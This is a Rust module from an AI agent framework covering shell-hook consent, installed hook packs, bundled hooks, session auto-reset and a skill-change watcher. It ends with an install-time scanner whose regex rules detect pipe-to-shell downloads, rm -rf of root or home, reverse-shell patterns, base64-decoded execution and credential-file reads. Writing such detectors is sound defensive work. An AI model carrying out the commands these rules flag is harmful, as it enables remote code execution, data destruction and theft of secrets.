//! `[hooks_extra]`: everything around hooks that is not the kernel's hook points —
//! first-use consent for shell hooks (Hermes agent/shell_hooks.py), bundled hooks
//! (OpenClaw src/hooks/bundled), installed hook packs (OpenClaw `hooks install|enable`),
//! outbound webhooks (Hermes `hooks.outbound`), session auto-reset (OpenClaw
//! session-auto-reset.ts + reset-policy.ts), the skill watcher (`skill_changed`) and the
//! channel-pipeline hook points (`inbound_claim`, `before_dispatch`, `reply_dispatch`,
//! `channel_pairing_requested`, `command`).
//!
//! ```toml
//! [hooks_extra]
//! auto_accept = false                 # run [[hooks]] without first-use consent (Hermes hooks_auto_accept)
//! bundled = ["command-logger"]        # boot-md, bootstrap-extra-files, command-logger,
//!                                     # compaction-notifier, session-memory (default: none)
//! skill_watch_secs = 30               # skill_changed polling interval; 0 = off (default 30, daemon only)
//! [hooks_extra.bootstrap_extra_files]
//! paths = ["packages/*/AGENTS.md"]    # aliases: patterns, files
//! [hooks_extra.session_memory]
//! messages = 15                       # user/assistant messages saved (default 15)
//! llm_slug = false                    # name the file with a model-made slug (default false)
//! model = ""                          # slug model, provider/model (default: model.aux)
//! [hooks_extra.session_reset]         # channel sessions only
//! mode = "none"                       # none | daily | idle (default none)
//! at_hour = 4                         # daily boundary, local hour 0–23 (default 4)
//! idle_minutes = 0                    # idle expiry; 0 = off (default 0)
//! [hooks_extra.session_reset.by_type.group]   # direct | group | thread overrides
//! mode = "idle"
//! [[hooks_extra.outbound]]            # see hooks_outbound.rs
//! [hooks_extra.gmail]                 # see gmail_hook.rs
//! ```

use seagent_channel::router::{Router, RouteKey};
use seagent_channel::{ChatType, Inbound};
use seagent_kernel::config::{Config, Paths};
use seagent_kernel::hooks::{self, Hook, HookConfig, HookDecision, HookEvent, ShellHook};
use seagent_kernel::kernel::Kernel;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::io::{IsTerminal, Write};
use std::path::{Path, PathBuf};
use std::sync::{Arc, OnceLock};

pub type KernelSlot = Arc<OnceLock<Kernel>>;

// ───────────────────────── config ─────────────────────────

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HooksExtra {
    /// Run `[[hooks]]` shell hooks without first-use consent. Default false.
    pub auto_accept: bool,
    /// Bundled hooks to enable (default none); `seagent hooks enable|disable` overrides per name.
    pub bundled: Vec<String>,
    /// Seconds between skill-directory scans for `skill_changed` (daemon). 0 = off. Default 30.
    pub skill_watch_secs: Option<u64>,
    pub bootstrap_extra_files: BootstrapExtra,
    pub session_memory: SessionMemoryCfg,
    pub session_reset: ResetCfg,
    pub outbound: Vec<crate::hooks_outbound::OutboundCfg>,
    pub gmail: Option<crate::gmail_hook::GmailCfg>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct BootstrapExtra {
    /// Glob / path patterns relative to the workspace (default none).
    pub paths: Vec<String>,
    /// Alias of `paths`.
    pub patterns: Vec<String>,
    /// Alias of `paths`.
    pub files: Vec<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SessionMemoryCfg {
    /// User/assistant messages written to the memory file. Default 15.
    pub messages: usize,
    /// Ask a model for a descriptive filename slug. Default false (timestamp slug).
    pub llm_slug: bool,
    /// Slug model (`provider/model`). Empty = `model.aux`.
    pub model: String,
}

impl Default for SessionMemoryCfg {
    fn default() -> Self {
        SessionMemoryCfg { messages: 15, llm_slug: false, model: String::new() }
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ResetRule {
    /// none | daily | idle. Unset = inherit (a type rule without a mode means daily, like OpenClaw).
    pub mode: Option<String>,
    /// Local hour of the daily boundary (0–23). Default 4.
    pub at_hour: Option<i64>,
    /// Minutes of inactivity after which the session is replaced. 0/unset = off.
    pub idle_minutes: Option<i64>,
}

#[derive(Debug, Clone, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ResetCfg {
    #[serde(flatten)]
    pub base: ResetRule,
    /// Overrides keyed by `direct`, `group` or `thread`.
    pub by_type: BTreeMap<String, ResetRule>,
}

impl HooksExtra {
    pub fn parse(cfg: &Config) -> Result<HooksExtra, String> {
        if cfg.hooks_extra.is_empty() {
            return Ok(HooksExtra::default());
        }
        toml::Value::Table(cfg.hooks_extra.clone()).try_into().map_err(|e: toml::de::Error| format!("[hooks_extra]: {}", e.message()))
    }
}

pub const BUNDLED: &[(&str, &str, &str)] = &[
    ("boot-md", "daemon_start", "Run BOOT.md from the workspace once when seagentd starts"),
    ("bootstrap-extra-files", "session_start", "Add extra AGENTS.md-class files (glob/path patterns) to new sessions"),
    ("command-logger", "command", "Append chat commands as JSON lines to <data>/logs/commands.log"),
    ("compaction-notifier", "pre_compact, post_compact", "Tell the chat when context compaction starts and finishes"),
    ("session-memory", "session_end", "Save recent conversation to <workspace>/memory/ on /new or auto-reset"),
];

// ───────────────────────── state: enabled packs/bundled, consent ─────────────────────────

pub fn hooks_dir(paths: &Paths) -> PathBuf {
    paths.data.join("hooks")
}

fn state_path(paths: &Paths) -> PathBuf {
    hooks_dir(paths).join("state.json")
}

/// `seagent hooks enable|disable` choices: name → enabled.
pub fn enabled_overrides(paths: &Paths) -> BTreeMap<String, bool> {
    std::fs::read_to_string(state_path(paths)).ok().and_then(|s| serde_json::from_str::<Value>(&s).ok()).and_then(|v| serde_json::from_value(v["enabled"].clone()).ok()).unwrap_or_default()
}

pub fn set_enabled(paths: &Paths, name: &str, on: bool) -> Result<(), String> {
    let mut m = enabled_overrides(paths);
    m.insert(name.to_string(), on);
    write_private(&state_path(paths), &serde_json::to_string_pretty(&json!({"enabled": m})).unwrap_or_default())
}

pub fn write_private(path: &Path, body: &str) -> Result<(), String> {
    if let Some(d) = path.parent() {
        std::fs::create_dir_all(d).map_err(|e| format!("{}: {e}", d.display()))?;
    }
    let tmp = path.with_extension("tmp");
    #[cfg(unix)]
    let mut f = {
        use std::os::unix::fs::OpenOptionsExt;
        std::fs::OpenOptions::new().write(true).create(true).truncate(true).mode(0o600).open(&tmp).map_err(|e| format!("{}: {e}", tmp.display()))?
    };
    #[cfg(not(unix))]
    let mut f = seagent_core::platform::fs_private::open_private(&tmp, seagent_core::platform::fs_private::OpenMode::Truncate).map_err(|e| format!("{}: {e}", tmp.display()))?;
    f.write_all(body.as_bytes()).map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, path).map_err(|e| format!("{}: {e}", path.display()))
}

pub fn bundled_enabled(x: &HooksExtra, paths: &Paths, name: &str) -> bool {
    enabled_overrides(paths).get(name).copied().unwrap_or_else(|| x.bundled.iter().any(|b| b == name))
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Approval {
    pub event: String,
    pub command: String,
    pub approved_at: String,
    #[serde(default)]
    pub script_mtime_at_approval: Option<String>,
}

pub fn allowlist_path(paths: &Paths) -> PathBuf {
    paths.data.join("shell-hooks-allowlist.json")
}

/// The allowlist and whether it could be read (missing = readable and empty).
pub fn load_allowlist(paths: &Paths) -> (Vec<Approval>, bool) {
    match std::fs::read_to_string(allowlist_path(paths)) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => (vec![], true),
        Err(_) => (vec![], false),
        Ok(s) => match serde_json::from_str::<Value>(&s).ok().and_then(|v| serde_json::from_value::<Vec<Approval>>(v["approvals"].clone()).ok()) {
            Some(a) => (a, true),
            None => (vec![], false),
        },
    }
}

fn save_allowlist(paths: &Paths, a: &[Approval]) -> Result<(), String> {
    write_private(&allowlist_path(paths), &serde_json::to_string_pretty(&json!({"approvals": a})).unwrap_or_default())
}

pub fn now_iso() -> String {
    iso(seagent_kernel::util::unix_now())
}

pub fn iso(t: i64) -> String {
    let (y, m, d) = seagent_kernel::util::civil_from_days(t.div_euclid(86_400));
    let s = t.rem_euclid(86_400);
    format!("{y:04}-{m:02}-{d:02}T{:02}:{:02}:{:02}Z", s / 3600, (s / 60) % 60, s % 60)
}

pub fn record_approval(paths: &Paths, event: &str, command: &str) -> Result<(), String> {
    let (mut a, _) = load_allowlist(paths);
    a.retain(|e| !(e.event == event && e.command == command));
    a.push(Approval { event: event.into(), command: command.into(), approved_at: now_iso(), script_mtime_at_approval: script_mtime(command) });
    save_allowlist(paths, &a)
}

/// Remove every approval of `command`; returns how many.
pub fn revoke(paths: &Paths, command: &str) -> Result<usize, String> {
    let (mut a, _) = load_allowlist(paths);
    let before = a.len();
    a.retain(|e| e.command != command);
    save_allowlist(paths, &a)?;
    Ok(before - a.len())
}

const SCRIPT_EXTENSIONS: &[&str] = &[".sh", ".bash", ".zsh", ".fish", ".py", ".pyw", ".rb", ".pl", ".lua", ".js", ".mjs", ".cjs", ".ts"];

/// Hermes `_command_script_path`: first token with a script extension, else the first
/// path-like token, else the first token.
pub fn script_path(command: &str) -> String {
    let parts: Vec<&str> = command.split_whitespace().collect();
    let p = parts.iter().find(|p| SCRIPT_EXTENSIONS.iter().any(|e| p.to_lowercase().ends_with(e))).or_else(|| parts.iter().find(|p| p.contains('/') || p.starts_with('~'))).or(parts.first()).copied().unwrap_or("");
    p.trim_matches(|c| c == '"' || c == '\'').to_string()
}

fn expand(p: &str) -> PathBuf {
    seagent_core::tool::expand_home(p)
}

pub fn script_mtime(command: &str) -> Option<String> {
    let m = std::fs::metadata(expand(&script_path(command))).ok()?.modified().ok()?;
    Some(iso(m.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs() as i64))
}

/// Runnable as configured: a bare script needs the exec bit, an interpreter-prefixed one read access.
pub fn script_is_executable(command: &str) -> bool {
    let sp = script_path(command);
    let path = expand(&sp);
    let Ok(md) = std::fs::metadata(&path) else { return false };
    if !md.is_file() {
        return false;
    }
    let first = command.split_whitespace().next().unwrap_or("").trim_matches(|c| c == '"' || c == '\'');
    if first == sp {
        crate::ops::hostos::is_executable(&path, &md)
    } else {
        std::fs::File::open(&path).is_ok()
    }
}

fn truthy(v: &str) -> bool {
    matches!(v.trim().to_ascii_lowercase().as_str(), "1" | "true" | "yes" | "on")
}

/// Any opt-in wins: `--accept-hooks` (sets SEAGENT_ACCEPT_HOOKS), the env var, `auto_accept`.
pub fn accept_all(x: &HooksExtra) -> bool {
    x.auto_accept || std::env::var("SEAGENT_ACCEPT_HOOKS").is_ok_and(|v| truthy(&v))
}

/// First-use consent (Hermes `_consented`): allowlisted, an opt-in (recorded), or a yes at
/// the terminal (recorded). Returns the hooks that may run plus warnings for skipped ones.
pub fn consented(hooks: &[HookConfig], x: &HooksExtra, paths: &Paths) -> (Vec<HookConfig>, Vec<String>) {
    let accept = accept_all(x);
    let (allow, readable) = load_allowlist(paths);
    let interactive = std::io::stdin().is_terminal() && std::io::stderr().is_terminal() && std::env::var_os("SEAGENT_HOOKS_NO_PROMPT").is_none();
    let mut ok = Vec::new();
    let mut warn = Vec::new();
    if !readable {
        warn.push(format!("hooks: {} is unreadable; treating every shell hook as unapproved", allowlist_path(paths).display()));
    }
    for h in hooks {
        let ev = h.event.name();
        if allow.iter().any(|a| a.event == ev && a.command == h.command) {
            ok.push(h.clone());
            continue;
        }
        if accept {
            if let Err(e) = record_approval(paths, &ev, &h.command) {
                warn.push(format!("hooks: approval not saved ({e}); it holds for this process only"));
            }
            ok.push(h.clone());
            continue;
        }
        if interactive && prompt_consent(&ev, &h.command) {
            if let Err(e) = record_approval(paths, &ev, &h.command) {
                warn.push(format!("hooks: approval not saved ({e}); it holds for this process only"));
            }
            ok.push(h.clone());
            continue;
        }
        warn.push(format!("shell hook for {ev} (`{}`) is not approved — skipped. Approve it with `seagent hooks approve`, run with --accept-hooks, or set [hooks_extra] auto_accept = true", h.command));
    }
    (ok, warn)
}

fn prompt_consent(event: &str, command: &str) -> bool {
    eprint!("\n⚠ seagent is about to register a shell hook that will run a\n  command on your behalf.\n\n    Event:   {event}\n    Command: {command}\n\n  Commands run with your full user credentials.  Only approve\n  commands you trust.\nAllow this hook to run? [y/N]: ");
    let _ = std::io::stderr().flush();
    let mut line = String::new();
    if std::io::stdin().read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes")
}

// ───────────────────────── hook packs (installed hooks) ─────────────────────────

/// An installed hook pack: `<dir>/HOOK.md` (front matter `name`, `description`, `events`)
/// plus an executable `handler` (any language; shell-hook protocol on stdin/stdout).
#[derive(Debug, Clone)]
pub struct Pack {
    pub name: String,
    pub description: String,
    pub events: Vec<String>,
    pub dir: PathBuf,
    pub handler: Option<PathBuf>,
    pub source: &'static str,
}

/// Front matter between `---` lines: `key: value`, `events` as `[a, b]` or `a, b`.
pub fn parse_hook_md(text: &str) -> BTreeMap<String, String> {
    let mut out = BTreeMap::new();
    let mut lines = text.lines();
    if lines.next().map(str::trim) != Some("---") {
        return out;
    }
    for l in lines {
        if l.trim() == "---" {
            break;
        }
        if let Some((k, v)) = l.split_once(':') {
            out.insert(k.trim().to_string(), v.trim().trim_matches('"').to_string());
        }
    }
    out
}

fn list_value(v: &str) -> Vec<String> {
    v.trim().trim_start_matches('[').trim_end_matches(']').split(',').map(|s| s.trim().trim_matches(|c| c == '"' || c == '\'').to_string()).filter(|s| !s.is_empty()).collect()
}

pub fn read_pack(dir: &Path, source: &'static str) -> Result<Pack, String> {
    let md = std::fs::read_to_string(dir.join("HOOK.md")).map_err(|e| format!("{}: {e}", dir.join("HOOK.md").display()))?;
    let fm = parse_hook_md(&md);
    let name = fm.get("name").cloned().filter(|n| !n.is_empty()).or_else(|| dir.file_name().map(|f| f.to_string_lossy().to_string())).unwrap_or_default();
    if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
        return Err(format!("hook pack name `{name}` must be letters, digits, - or _"));
    }
    let events = fm.get("events").map(|e| list_value(e)).unwrap_or_default();
    if events.is_empty() {
        return Err(format!("hook pack {name}: HOOK.md front matter needs `events: [..]`"));
    }
    for e in &events {
        if HookEvent::parse(e).is_none() {
            return Err(format!("hook pack {name}: unknown event `{e}`"));
        }
    }
    let handler = ["handler", "handler.sh", "handler.py", "handler.js"].iter().map(|h| dir.join(h)).find(|p| p.is_file());
    Ok(Pack { name, description: fm.get("description").cloned().unwrap_or_default(), events, dir: dir.to_path_buf(), handler, source })
}

/// Packs in `<data>/hooks/` (managed) and `<workspace>/.seagent/hooks/` (workspace).
pub fn discover_packs(paths: &Paths, ws: &Path) -> (Vec<Pack>, Vec<String>) {
    let mut packs = Vec::new();
    let mut warn = Vec::new();
    for (root, src) in [(hooks_dir(paths), "managed"), (ws.join(".seagent/hooks"), "workspace")] {
        let Ok(rd) = std::fs::read_dir(&root) else { continue };
        let mut dirs: Vec<PathBuf> = rd.flatten().map(|e| e.path()).filter(|p| p.join("HOOK.md").is_file()).collect();
        dirs.sort();
        for d in dirs {
            match read_pack(&d, src) {
                Ok(p) if packs.iter().any(|q: &Pack| q.name == p.name) => warn.push(format!("hook pack {} in {} shadowed by an earlier one", p.name, d.display())),
                Ok(p) => packs.push(p),
                Err(e) => warn.push(e),
            }
        }
    }
    (packs, warn)
}

fn pack_hooks(p: &Pack) -> Result<Vec<Arc<dyn Hook>>, String> {
    let handler = p.handler.as_ref().ok_or_else(|| format!("hook pack {}: no handler executable", p.name))?;
    let cmd = format!("'{}'", handler.to_string_lossy().replace('\'', "'\\''"));
    p.events
        .iter()
        .filter_map(|e| HookEvent::parse(e))
        .map(|event| ShellHook::new(HookConfig { event, matcher: String::new(), command: cmd.clone(), timeout_secs: 30 }).map(|h| Arc::new(h) as Arc<dyn Hook>))
        .collect()
}

// ───────────────────────── loading ─────────────────────────

/// Hooks from `[hooks_extra]` and the state dir: consented shell hooks, enabled packs,
/// bundled hooks and outbound webhooks.
pub fn load(cfg: &Config, paths: &Paths, ws: &Path, kernel: &KernelSlot, secrets: Arc<dyn Fn(&str) -> String + Send + Sync>) -> (Vec<Arc<dyn Hook>>, Vec<String>) {
    let mut warn = Vec::new();
    let x = match HooksExtra::parse(cfg) {
        Ok(x) => x,
        Err(e) => {
            warn.push(e);
            HooksExtra::default()
        }
    };
    let mut out: Vec<Arc<dyn Hook>> = Vec::new();
    let (ok, w) = consented(&cfg.hooks, &x, paths);
    warn.extend(w);
    match hooks::shell_hooks(&ok) {
        Ok(h) => out.extend(h),
        Err(e) => warn.push(format!("hooks: {e}")),
    }
    let over = enabled_overrides(paths);
    let (packs, w) = discover_packs(paths, ws);
    warn.extend(w);
    for p in packs.iter().filter(|p| over.get(&p.name).copied().unwrap_or(false)) {
        match pack_hooks(p) {
            Ok(h) => out.extend(h),
            Err(e) => warn.push(e),
        }
    }
    for b in &x.bundled {
        if !BUNDLED.iter().any(|(n, _, _)| n == b) {
            warn.push(format!("[hooks_extra] bundled: unknown hook `{b}` (known: {})", BUNDLED.iter().map(|b| b.0).collect::<Vec<_>>().join(", ")));
        }
    }
    for (name, _, _) in BUNDLED {
        if bundled_enabled(&x, paths, name) {
            out.push(crate::hooks_bundled::make(name, &x, paths, kernel.clone()));
        }
    }
    let (targets, w) = crate::hooks_outbound::targets(&x.outbound, cfg);
    warn.extend(w);
    if !targets.is_empty() && std::env::var("SEAGENT_SAFE_MODE").is_ok_and(|v| truthy(&v)) {
        warn.push("SEAGENT_SAFE_MODE=1 — outbound webhooks not registered".into());
    } else if !targets.is_empty() {
        out.push(Arc::new(crate::hooks_outbound::Outbound::with(targets, secrets, crate::hooks_outbound::RETRY_BACKOFF)));
    }
    (out, warn)
}

// ───────────────────────── channel pipeline hook points ─────────────────────────

fn inbound_payload(m: &Inbound, session: Option<&str>, text: &str) -> Value {
    json!({
        "session_id": session.unwrap_or(""), "cwd": "", "channel": m.channel, "account_id": m.account, "chat": m.chat, "conversation_id": m.chat,
        "sender": m.sender, "sender_id": m.sender, "sender_name": m.sender_name, "content": text, "prompt": text, "body": text,
        "message_id": m.message_id, "thread_id": m.thread, "timestamp": m.ts, "is_group": m.chat_type != ChatType::Direct,
        "was_mentioned": m.mentioned, "reply_to_id": m.reply.as_ref().map(|r| r.id.clone()), "reply_to_body": m.reply.as_ref().map(|r| r.text.clone()),
        "reply_to_sender": m.reply.as_ref().map(|r| r.author.clone()), "result": Value::Null,
    })
}

fn first_handled(k: &Kernel, event: HookEvent, p: Value) -> Option<Option<String>> {
    if !k.has_hooks(event) {
        return None;
    }
    let (name, d) = k.emit_first(event, p, |d| matches!(d, HookDecision::Modify(v) if hooks::handled(v).is_some()))?;
    eprintln!("seagentd: channel message handled by {name} ({})", event.name());
    match d {
        HookDecision::Modify(v) => hooks::handled(&v),
        _ => None,
    }
}

/// `inbound_claim`: Some(reply) when a hook owns this message.
pub fn inbound_claim(k: &Kernel, m: &Inbound, session: Option<&str>) -> Option<Option<String>> {
    first_handled(k, HookEvent::InboundClaim, inbound_payload(m, session, &m.text))
}

/// `before_dispatch`: Some(text) when a hook answered instead of the agent.
pub fn before_dispatch(k: &Kernel, m: &Inbound, session: &str, text: &str) -> Option<Option<String>> {
    first_handled(k, HookEvent::BeforeDispatch, inbound_payload(m, Some(session), text))
}

/// `reply_dispatch`: Some(text) when a hook takes over the reply for this run.
pub fn reply_dispatch(k: &Kernel, channel: &str, chat: &str, thread: Option<&str>, session: &str) -> Option<Option<String>> {
    let p = json!({"session_id": session, "cwd": "", "channel": channel, "chat": chat, "thread_id": thread, "dispatch_kind": "agent", "originating_channel": channel, "originating_to": chat, "send_policy": "allow", "result": Value::Null});
    first_handled(k, HookEvent::ReplyDispatch, p)
}

/// `channel_pairing_requested` (observe only); the code is read from the pairing reply.
pub fn pairing_requested(k: &Kernel, m: &Inbound, reply: &str) {
    if !k.has_hooks(HookEvent::ChannelPairingRequested) {
        return;
    }
    let code = reply.split("seagent pairing approve ").nth(1).and_then(|r| r.split_whitespace().nth(1)).map(|c| c.chars().take_while(|c| c.is_ascii_alphanumeric()).collect::<String>()).unwrap_or_default();
    let p = json!({"session_id": "", "cwd": "", "channel": m.channel, "account_id": m.account, "sender_id": m.sender, "code": code, "metadata": {"sender_name": m.sender_name, "chat": m.chat, "chat_name": m.chat_name}});
    k.emit(HookEvent::ChannelPairingRequested, p, "");
}

/// OpenClaw internal `command:<action>` event (observe only).
pub fn command_event(k: &Kernel, m: &Inbound, action: &str, session: Option<&str>) {
    if k.has_hooks(HookEvent::Command) {
        k.emit(HookEvent::Command, json!({"session_id": session.unwrap_or(""), "cwd": "", "action": action, "sender": m.sender, "sender_id": m.sender, "source": m.channel, "chat": m.chat, "timestamp": now_iso()}), "");
    }
}

// ───────────────────────── session auto-reset ─────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub struct Policy {
    pub mode: String,
    pub at_hour: i64,
    pub idle_minutes: Option<i64>,
}

/// OpenClaw `resolveSessionResetPolicy`: a type rule overrides the base; a configured rule
/// without a mode means daily; the default is none.
pub fn policy(cfg: &ResetCfg, reset_type: &str) -> Policy {
    let base = &cfg.base;
    let typed = cfg.by_type.get(reset_type);
    let base_set = base.mode.is_some() || base.at_hour.is_some() || base.idle_minutes.is_some();
    let inherited = typed.and(base.mode.clone()).filter(|m| m != "none");
    let mode = typed.and_then(|t| t.mode.clone()).or(inherited).or_else(|| typed.map(|_| "daily".to_string())).or(base.mode.clone()).unwrap_or_else(|| if base_set { "daily".into() } else { "none".into() });
    let at_hour = typed.and_then(|t| t.at_hour).or(base.at_hour).unwrap_or(4).clamp(0, 23);
    let idle = typed.and_then(|t| t.idle_minutes).or(base.idle_minutes).map(|m| m.max(0)).or((mode == "idle").then_some(0));
    Policy { mode, at_hour, idle_minutes: idle }
}

/// OpenClaw `evaluateSessionFreshness`: Some("daily"|"idle") when the session is stale.
/// Times in unix millis; `offset_min` is the local UTC offset for the daily boundary.
pub fn stale_reason(p: &Policy, started_ms: u64, last_ms: u64, now_ms: u64, offset_min: i32) -> Option<&'static str> {
    if p.mode == "none" {
        return None;
    }
    let off = offset_min as i64 * 60_000;
    let daily_at = (p.mode == "daily").then(|| {
        let local = now_ms as i64 + off;
        let today = local.div_euclid(86_400_000) * 86_400_000 + p.at_hour * 3_600_000;
        (if local < today { today - 86_400_000 } else { today }) - off
    });
    let idle_at = p.idle_minutes.filter(|m| *m > 0).map(|m| last_ms as i64 + m * 60_000);
    let stale_daily = daily_at.is_some_and(|d| (started_ms as i64) < d);
    let stale_idle = idle_at.is_some_and(|i| now_ms as i64 > i);
    match (stale_daily, stale_idle) {
        (true, true) => Some(if daily_at.unwrap_or(i64::MAX) <= idle_at.unwrap_or(i64::MAX) { "daily" } else { "idle" }),
        (true, false) => Some("daily"),
        (false, true) => Some("idle"),
        _ => None,
    }
}

/// Before a channel message reaches its session: replace a stale one (idle / daily policy).
/// Returns the session to use (None = make a new one).
pub fn auto_reset(k: &Kernel, router: &Router, key: &RouteKey, session: Option<String>, m: &Inbound) -> Option<String> {
    let sid = session?;
    let Ok(x) = HooksExtra::parse(&k.cfg) else { return Some(sid) };
    let kind = if m.thread.is_some() { "thread" } else if m.chat_type == ChatType::Direct { "direct" } else { "group" };
    let p = policy(&x.session_reset, kind);
    if p.mode == "none" {
        return Some(sid);
    }
    let Ok(events) = k.store.read(&sid) else { return Some(sid) };
    let started = events.first().map(|e| e.ts).unwrap_or(0);
    let last = events.iter().rev().find(|e| matches!(e.kind, seagent_kernel::event::EventKind::Message { .. } | seagent_kernel::event::EventKind::Inbox { .. })).map(|e| e.ts).unwrap_or(started);
    let Some(reason) = stale_reason(&p, started, last, seagent_kernel::event::now_ms(), k.cfg.schedule.utc_offset_minutes) else { return Some(sid) };
    if k.is_running(&sid) {
        return Some(sid);
    }
    eprintln!("seagentd: channel {}: session {sid} reset ({reason})", m.channel);
    k.end_session(&sid, reason);
    router.reset(key);
    None
}

// ───────────────────────── skill watcher (skill_changed) ─────────────────────────

/// One skill as `skill_changed` reports it (OpenClaw `PluginHookSkillArtifact`).
pub fn skill_artifact(dir: &Path) -> Option<Value> {
    let file = dir.join("SKILL.md");
    let body = std::fs::read(&file).ok()?;
    let fm = parse_hook_md(&String::from_utf8_lossy(&body));
    let name = fm.get("name").cloned().unwrap_or_else(|| dir.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default());
    let mut files: Vec<(String, Vec<u8>)> = Vec::new();
    walk(dir, dir, &mut files, 0);
    files.sort();
    let mut tree = Vec::new();
    for (rel, data) in &files {
        tree.extend_from_slice(rel.as_bytes());
        tree.push(0);
        tree.extend_from_slice(seagent_net::crypto::hex(&seagent_net::crypto::sha256(data)).as_bytes());
        tree.push(b'\n');
    }
    Some(json!({
        "name": name, "skill_key": name, "description": fm.get("description"), "skill_file": file, "skill_dir": dir, "source": "filesystem",
        "revision": {"declared_version": fm.get("version"), "content_sha256": seagent_net::crypto::hex(&seagent_net::crypto::sha256(&body)), "tree_sha256": seagent_net::crypto::hex(&seagent_net::crypto::sha256(&tree))},
    }))
}

fn walk(root: &Path, dir: &Path, out: &mut Vec<(String, Vec<u8>)>, depth: usize) {
    if depth > 6 || out.len() > 500 {
        return;
    }
    let Ok(rd) = std::fs::read_dir(dir) else { return };
    for e in rd.flatten() {
        let p = e.path();
        let Ok(ft) = e.file_type() else { continue };
        if ft.is_dir() && !e.file_name().to_string_lossy().starts_with('.') {
            walk(root, &p, out, depth + 1);
        } else if ft.is_file() {
            if let (Ok(rel), Ok(md)) = (p.strip_prefix(root), e.metadata()) {
                if md.len() <= 4 * 1024 * 1024 {
                    out.push((rel.to_string_lossy().to_string(), std::fs::read(&p).unwrap_or_default()));
                }
            }
        }
    }
}

/// Every skill under `dirs`, keyed by directory.
pub fn skill_snapshot(dirs: &[PathBuf]) -> BTreeMap<PathBuf, Value> {
    let mut m = BTreeMap::new();
    for d in dirs {
        let Ok(rd) = std::fs::read_dir(d) else { continue };
        for e in rd.flatten() {
            if let Some(a) = skill_artifact(&e.path()) {
                m.insert(e.path(), a);
            }
        }
    }
    m
}

/// `skill_changed` payloads between two snapshots.
pub fn skill_changes(before: &BTreeMap<PathBuf, Value>, after: &BTreeMap<PathBuf, Value>) -> Vec<Value> {
    let mut out = Vec::new();
    let ev = |action: &str, b: Option<&Value>, a: Option<&Value>| json!({"session_id": "", "cwd": "", "action": action, "source": "filesystem", "occurred_at": now_iso(), "before": b, "after": a});
    for (k, a) in after {
        match before.get(k) {
            None => out.push(ev("created", None, Some(a))),
            Some(b) if b["revision"] != a["revision"] => out.push(ev("updated", Some(b), Some(a))),
            _ => {}
        }
    }
    for (k, b) in before {
        if !after.contains_key(k) {
            out.push(ev("removed", Some(b), None));
        }
    }
    out
}

/// Daemon services owned by `[hooks_extra]`: the skill watcher and the Gmail watcher.
pub fn start_daemon_services(k: &Kernel, ws: &Path, stop: seagent_core::Cancel) -> Vec<std::thread::JoinHandle<()>> {
    let x = match HooksExtra::parse(&k.cfg) {
        Ok(x) => x,
        Err(e) => {
            eprintln!("seagentd: {e}");
            return vec![];
        }
    };
    let mut hs = Vec::new();
    let every = x.skill_watch_secs.unwrap_or(30);
    if every > 0 {
        let (k, dirs, stop) = (k.clone(), k.paths.skills_dirs(ws), stop.clone());
        hs.push(std::thread::spawn(move || {
            let mut prev = skill_snapshot(&dirs);
            while !stop.is_cancelled() {
                let until = std::time::Instant::now() + std::time::Duration::from_secs(every);
                while std::time::Instant::now() < until && !stop.is_cancelled() {
                    std::thread::sleep(std::time::Duration::from_millis(200));
                }
                if !k.has_hooks(HookEvent::SkillChanged) {
                    continue;
                }
                let next = skill_snapshot(&dirs);
                for p in skill_changes(&prev, &next) {
                    k.emit(HookEvent::SkillChanged, p, "");
                }
                prev = next;
            }
        }));
    }
    if let Some(g) = x.gmail.filter(|g| g.enabled) {
        match crate::gmail_hook::start(k.clone(), g, stop) {
            Ok(h) => hs.extend(h),
            Err(e) => eprintln!("seagentd: gmail watcher not started: {e}"),
        }
    }
    hs
}

// ───────────────────────── before_install ─────────────────────────

/// OpenClaw's built-in install scan: findings per file/line for obviously dangerous code.
pub fn builtin_scan(dir: &Path) -> Value {
    const RULES: &[(&str, &str, &str, &str)] = &[
        ("pipe-to-shell", "critical", r"(curl|wget)[^|\n]*\|\s*(sudo\s+)?(ba|z)?sh\b", "downloads and runs a remote script"),
        ("rm-root", "critical", r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f?\s+(/|~|\$HOME)(\s|$)", "recursive delete of / or home"),
        ("reverse-shell", "critical", r"/dev/tcp/|nc\s+-e\s|bash\s+-i\s+>&", "reverse shell pattern"),
        ("sudo", "warn", r"\bsudo\b", "uses sudo"),
        ("eval-base64", "warn", r"base64\s+(-d|--decode)[^\n]*\|\s*(ba)?sh|eval\s*\(\s*atob", "decodes and runs hidden code"),
        ("credential-read", "warn", r"\.ssh/id_|\.aws/credentials|secrets\.toml", "reads credential files"),
    ];
    let rules: Vec<(&str, &str, regex::Regex, &str)> = RULES.iter().filter_map(|(id, sev, re, msg)| regex::Regex::new(re).ok().map(|r| (*id, *sev, r, *msg))).collect();
    let mut files = Vec::new();
    if dir.is_file() {
        files.push((dir.file_name().map(|f| f.to_string_lossy().to_string()).unwrap_or_default(), std::fs::read(dir).unwrap_or_default()));
    } else {
        walk(dir, dir, &mut files, 0);
    }
    let mut findings = Vec::new();
    let (mut crit, mut warn) = (0, 0);
    for (rel, data) in &files {
        let text = String::from_utf8_lossy(data);
        for (i, line) in text.lines().enumerate() {
            for (id, sev, re, msg) in &rules {
                if re.is_match(line) {
                    if *sev == "critical" {
                        crit += 1;
                    } else {
                        warn += 1;
                    }
                    findings.push(json!({"rule_id": id, "severity": sev, "file": rel, "line": i + 1, "message": msg}));
                }
            }
        }
    }
    json!({"status": "ok", "scanned_files": files.len(), "critical": crit, "warn": warn, "info": 0, "findings": findings})
}

